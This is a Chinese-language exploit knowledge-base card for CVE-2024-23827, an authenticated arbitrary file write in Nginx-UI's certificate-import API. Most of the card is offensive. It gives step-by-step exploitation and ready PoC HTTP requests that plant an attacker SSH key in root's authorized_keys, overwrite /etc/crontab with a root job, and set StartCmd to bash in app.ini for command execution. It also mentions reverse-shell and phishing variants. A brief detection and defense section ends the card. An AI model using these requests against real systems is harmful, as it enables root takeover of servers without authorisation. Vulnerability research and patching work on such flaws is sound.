---
id: web-golang-nginx-ui-cert-add-arbitrary-file-write
title: Nginx-UI 证书导入 /api/cert 任意文件写入：路径与内容不校验，写 authorized_keys、/etc/crontab 或覆盖 app.ini 的 StartCmd 换 RCE（CVE-2024-23827）
type: scenario
domain: web
path: web/golang
technique: nginx-ui-cert-add-arbitrary-file-write
tags:
- golang
- gin
- nginx-ui
- arbitrary-file-write
- cve-2024-23827
- authenticated
- rce
- authorized-keys
- cron
cve:
- CVE-2024-23827
affected_versions: <v2.0.0-beta.12
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V564
  verified_at: '2026-11-12T07:56:21+08:00'
  notes: 已对照原文与16张图片逐张核对：原文明确影响版本<v2.0.0-beta.12、安全版本v2.0.0-beta.12（已set-versions）；图01导入证书页面、02 POST /api/cert抓包、03 /api路由组与authRequired/proxy、04 CheckToken查库与GenerateJWT用settings.JwtSecret、05 app.ini中StartCmd、06 NewPipeLine的exec.Command(settings.ServerSettings.StartCmd)、07 nginx-ui -config app.ini、08 InitCertificateRouter POST cert→AddCert、09/10 写/root/comb/app.ini返回200且响应回显写入的完整配置、11/12 写/root/.ssh/authorized_keys、13 root SSH登录成功、14 authorized_keys请求返回200、15 /etc/crontab请求返回200并回显写入内容、16 Web终端PTY每分钟输出root（计划任务执行），均与正文/截图一致；AddCert→Content.WriteFile的MkdirAll+os.WriteFile无路径/内容校验、认证后漏洞、0644无可执行位故选择已存在被消费文件（authorized_keys/crontab/app.ini StartCmd）等判断均成立。未复跑。dedup仅自匹配duplicate，其余候选（1Panel /files/save、Nginx-UI备份泄露、NginxWebUI上传解压等）为related不同产品/接口/CVE，非同链。
url: /docs/web/golang/web-golang-nginx-ui-cert-add-arbitrary-file-write/
draft: false
kb_aliases:
- CVE-2024-23827
- Nginx-UI 任意文件写入
- Nginx UI 导入证书
- Import Certificate 任意写
- AddCert
- cert.Content.WriteFile
- StartCmd 命令执行
---

## 一句话结论

Nginx-UI 的导入证书接口 `POST /api/cert`（`certificate.AddCert` → `cert.Content.WriteFile`）把请求中的 `ssl_certificate_path`、`ssl_certificate` 原样交给 `os.WriteFile`，既不校验内容是否为证书/密钥，也不限制写入路径；登录用户可向任意绝对路径覆盖写入任意内容，写 `/root/.ssh/authorized_keys` 换 root SSH 登录、覆盖 `/etc/crontab` 加计划任务、或改 `app.ini` 的 `StartCmd` 后重启，均可升级为命令执行（CVE-2024-23827，影响 `<v2.0.0-beta.12`）。

## 原理

- **路由与鉴权**：`root := r.Group("/api")` 下 `g := root.Group("/", authRequired(), proxy())`，`certificate.InitCertificateRouter(g)` 在 `g` 内注册 `r.POST("cert", AddCert)`。`authRequired()` 从 `Authorization` 头取 token 交给 `model.CheckToken` 查库比对（也支持 `X-Node-Secret` 等于配置中的 `NodeSecret`，或 `x_node_id` + base64 的 `token` 查询参数）；JWT 的 `JwtSecret` 来自配置文件且签发后入库比对，鉴权链本身没有绕过点，所以这是**认证后的后台漏洞**。
- **输入校验缺失**：`AddCert` 绑定的匿名结构体中 `ssl_certificate_path` 与 `ssl_certificate_key_path` 只标了 `binding:"required"`，`ssl_certificate` / `ssl_certificate_key` 内容完全自由；随后创建 `cert.Content` 并调用 `WriteFile()`。
- **写入 sink**：`Content.WriteFile()` 对两个路径分别 `os.MkdirAll(filepath.Dir(path), 0644)`，内容非空时 `os.WriteFile(path, []byte(content), 0644)`。代码对路径没有任何 `filepath.Clean`/前缀/基目录限制，对内容没有任何 PEM 格式或类型检查——"导入证书"功能被当成了通用文件写入器。
- **为什么能升级到 RCE**：Go 编译型程序无法落地 webshell，且新建文件权限 `0644` 没有执行位，所以利用点应选**已存在且会被高权限进程消费的文件**：
  1. `~/.ssh/authorized_keys`：写入攻击者公钥，sshd 直接认。
  2. `/etc/crontab`（或 `/etc/cron.d/*`、`/var/spool/cron/root`）：覆盖为含一行 `* * * * * root <cmd>` 的合法 crontab，cron 每分钟以 root 执行，不依赖执行位。
  3. `app.ini`（服务启动配置文件）：程序内的 `NewPipeLine`（Web 终端）执行 `exec.Command(settings.ServerSettings.StartCmd)`，把 `StartCmd` 改成 `bash` 或任意命令，重启 Nginx-UI 后打开终端/新建 PTY 即触发命令执行。
- **前提是进程权限**：Nginx-UI 通常以 root 运行，因此可覆盖系统文件；若以普通用户运行，只能写该用户可写路径（如该用户自己的 `~/.ssh/authorized_keys`、用户 crontab）。

## 触发条件

- 目标版本 `<v2.0.0-beta.12`（`v2.0.0-beta.12` 修复）。
- 攻击者持有有效登录 token（`Authorization` 头；`/api` 私有路由组要求认证）。
- Nginx-UI 进程对目标路径有写权限（root 运行时几乎不受限）。
- 按利用路线分别需要：sshd 允许公钥登录；cron 服务运行；或可触发 Nginx-UI 重启并打开 Web 终端（`StartCmd` 路线）。

## 利用步骤

1. 登录 Nginx-UI 获取 JWT，确认 `GET /api/certs` 等接口可用。
2. 按目标选择写入文件（两条 path 字段必填，内容字段按需给出，非空即写）：
   - **SSH 公钥**：本地 `ssh-keygen -t rsa -b 4096`，把 `id_rsa.pub` 内容作为 `ssl_certificate`，`ssl_certificate_path` 指 `/root/.ssh/authorized_keys`；写入后 `ssh -i id_rsa root@target` 直接登录。
   - **计划任务**：`ssl_certificate_path` 指 `/etc/crontab`，内容为完整 crontab 并在末尾追加 `* * * * * root <命令> >> /var/log/out 2>&1`；等一个调度周期后用日志验证执行结果。
   - **配置文件**：`ssl_certificate_path` 指 `app.ini` 实际路径（如 `/root/comb/app.ini`），内容为完整配置，保留原 `JwtSecret`/`NodeSecret`/`Database` 等值，只改 `StartCmd`（如 `StartCmd = bash`）；重启 Nginx-UI 后打开 Web 终端，PTY 以 `StartCmd` 启动。
3. 验证：SSH 登录成功 / 计划任务输出文件出现 / 终端拿到 shell。

## PoC

写 SSH 公钥（最小化；原文实测返回 200 并成功免密登录）：

```http
POST /api/cert HTTP/1.1
Host: target:9000
Authorization: <JWT>
Content-Type: application/json

{"name":"poc","ssl_certificate_path":"/root/.ssh/authorized_keys","ssl_certificate_key_path":"/tmp/test2","ssl_certificate":"ssh-rsa AAAAB3NzaC1yc2E...== attacker@kali","ssl_certificate_key":"x"}
```

覆盖 `/etc/crontab`（原文实测写文件与命令执行截图均成功）：

```http
POST /api/cert HTTP/1.1
Host: target:9000
Authorization: <JWT>
Content-Type: application/json

{"name":"poc","ssl_certificate_path":"/etc/crontab","ssl_certificate_key_path":"/tmp/test2","ssl_certificate":"SHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\n* * * * * root /usr/bin/whoami >> /var/log/whoami.log 2>&1\n","ssl_certificate_key":"x"}
```

覆盖 `app.ini` 改 `StartCmd`（关键片段，需保留原配置其余项，重启后打开 Web 终端触发 `exec.Command(StartCmd)`）：

```json
{"name":"poc","ssl_certificate_path":"/root/comb/app.ini","ssl_certificate_key_path":"/tmp/test2","ssl_certificate":"[server]\nHttpHost = 0.0.0.0\nHttpPort = 9000\nJwtSecret = <原值>\nNodeSecret = <原值>\nDatabase = database\nStartCmd = bash\n...","ssl_certificate_key":"x"}
```

## 变体与关联

- **同类产品对照**：[[web-golang-1panel-files-save-arbitrary-file-write-authorized-keys]]——1Panel 的 `/files/save` 也是认证后 path/content 全可控、写 `/root/.ssh/authorized_keys` 换登录（CVE-2023-39966），与本卡手法同型、产品与接口不同。
- **同产品关联**：[[web-generic-auth-nginx-ui-backup-unauth-key-leak]]（Nginx-UI 备份未授权下载，CVE-2026-27944）——可先用其拿配置/密钥，再结合本卡的任意写完成利用链。
- **变体落地**：可改 `/etc/cron.d/*`、`/var/spool/cron/root`、systemd unit、nginx conf、静态 Web 目录（写 HTML/JS 钓鱼或配合 FastCGI 解析）等；`StartCmd` 路线也可直接替换为反弹 shell 命令。
- **边界**：Nginx-UI 以非 root 运行、挂载只读文件系统、或目标路径被 SELinux/AppArmor 限制时，写入范围缩小；`app.ini` 路线需要能重启服务（或等待自然重启）。

## 检测与防御

- **检测**：`/api/cert` 请求的 `ssl_certificate_path` 指向证书目录之外的绝对路径；`ssl_certificate` 内容不含 `-----BEGIN CERTIFICATE-----`/`PRIVATE KEY` 而包含 `ssh-rsa`、`# For details see man 4 crontabs`、`[server]` 等特征；`authorized_keys`、`/etc/crontab`、`app.ini` 出现非运维变更；面板进程派生的异常子进程（`StartCmd`）。
- **防御**：升级到 `v2.0.0-beta.12` 及以上；证书路径改为服务端按白名单目录生成的文件名、不接受客户端绝对路径（`filepath.Clean` + 基目录前缀校验）；对证书/密钥内容做 PEM 解析校验；Nginx-UI 以最小权限用户运行；监控关键系统文件与面板配置文件完整性。
